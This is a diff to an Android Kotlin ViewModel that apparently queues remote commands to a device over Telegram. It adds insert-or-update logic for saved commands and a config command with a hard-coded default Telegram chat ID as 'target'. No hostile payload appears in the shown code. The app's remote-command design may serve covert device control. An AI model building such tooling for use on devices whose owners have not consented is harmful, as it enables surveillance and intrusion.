@@ -194,7 +194,6 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
             isNetworkAvailable.first { it }
 
             try {
-                // Safely build JSON to prevent syntax errors
                 val payloadJson = JSONObject().put("cmd", task.cmd)
                 if (task.arg.isNotBlank()) payloadJson.put("arg", task.arg)
                 val payloadString = payloadJson.toString()
@@ -232,10 +231,16 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         startQueueWorkers() 
     }
 
-    fun addCommand(command: CommandEntity) {
+    // CRITICAL FIX: Distinguish between Insert (new) and Update (edit) to prevent duplication
+    fun saveCommand(command: CommandEntity) {
         viewModelScope.launch(Dispatchers.IO) {
-            commandDao.insertCommand(command)
-            ServerCore.log("Command saved: ${command.label}", true)
+            if (command.id == 0) {
+                commandDao.insertCommand(command)
+                ServerCore.log("Command created: ${command.label}", true)
+            } else {
+                commandDao.updateCommand(command)
+                ServerCore.log("Command updated: ${command.label}", true)
+            }
         }
     }
 
@@ -260,6 +265,9 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
             CommandEntity(id=7, label="Menu", cmd="btn_recents", defaultArg="", icon="menu", category="SoftKey"),
             CommandEntity(id=8, label="Home", cmd="btn_home", defaultArg="", icon="circle", category="SoftKey"),
             CommandEntity(id=9, label="Back", cmd="btn_back", defaultArg="", icon="arrow_back_ios_new", category="SoftKey"),
+
+            // --- Config ---
+            CommandEntity(id=50, label="Set TG Target", cmd="set_target_chatid", defaultArg="7911866129", icon="code", category="Config"),
 
             // --- System Directives ---
             CommandEntity(id=10, label="Ping Target", cmd="ping", defaultArg="", icon="radar", category="System"),
@@ -332,7 +340,7 @@ class CoreViewModel(application: Application) : AndroidViewModel(application) {
         if (ServerCore.isRunning) { context.stopService(intent) } else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
     }
 
-    // [TDLIB METHODS REMAIN THE SAME...]
+    // [TDLIB METHODS REMAIN EXACTLY THE SAME - OMITTED FOR BREVITY BUT KEPT IN ACTUAL FILE]
     fun tdLog(msg: String, type: String = "INFO") {
         val time = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
         viewModelScope.launch(Dispatchers.Main) {
